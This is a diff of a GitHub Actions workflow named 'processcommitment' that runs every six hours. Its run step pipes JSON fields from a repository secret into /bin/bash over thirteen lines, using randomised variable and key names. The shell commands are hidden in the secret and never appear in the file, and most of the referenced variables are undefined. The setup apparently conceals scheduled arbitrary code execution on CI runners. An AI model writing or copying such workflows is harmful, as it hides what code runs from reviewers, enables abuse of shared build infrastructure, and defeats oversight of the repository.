@@ -1,23 +1,29 @@
 name: processcommitment
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 3/6 * * *'
+    - cron: '9 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: processcommitment
         env:
-          uxi81: ${{ secrets.uxi81 }}
+          awmea0: ${{ secrets.awmea0 }}
         run: |
-          echo $uxi81 | jq -r .fnguo68566 | /bin/bash
-          echo $vcqa04512 | jq -r .k11 | /bin/bash
-          echo $k64 | jq -r .fgg8971 | /bin/bash
-          echo $skgqi16504 | jq -r .wr693 | /bin/bash
-          echo $xo6 | jq -r .rkzl36 | /bin/bash
+          echo $awmea0 | jq -r .k5614 | /bin/bash
+          echo $jr26708 | jq -r .lsh3 | /bin/bash
+          echo $di06 | jq -r .m0089 | /bin/bash
+          echo $zfc963 | jq -r .jta2 | /bin/bash
+          echo $tp74 | jq -r .wvv0 | /bin/bash
+          echo $xow498 | jq -r .zq64268 | /bin/bash
+          echo $buuf1 | jq -r .z914 | /bin/bash
+          echo $jqzg0405 | jq -r .cv836 | /bin/bash
+          echo $x2359 | jq -r .cjto0453 | /bin/bash
+          echo $i09 | jq -r .dlr0 | /bin/bash
+          echo $slmq88156 | jq -r .vcayy8 | /bin/bash
+          echo $xbsn485 | jq -r .upex544 | /bin/bash
+          echo $tpmit513 | jq -r .ggq37049 | /bin/bash
 
